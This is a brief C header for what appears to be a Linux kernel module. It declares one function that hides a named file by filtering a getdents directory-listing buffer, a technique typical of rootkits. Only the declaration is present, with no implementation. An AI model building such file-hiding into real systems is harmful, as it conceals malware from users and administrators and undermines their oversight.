#ifndef YARIN_MODULE_STEP2_H
#define YARIN_MODULE_STEP2_H
#include <linux/types.h>

unsigned long step2_hide_file_by_name(void* getdents_buffer, size_t getdents_buffer_size, char* filename_to_hide);

#endif //YARIN_MODULE_STEP2_H
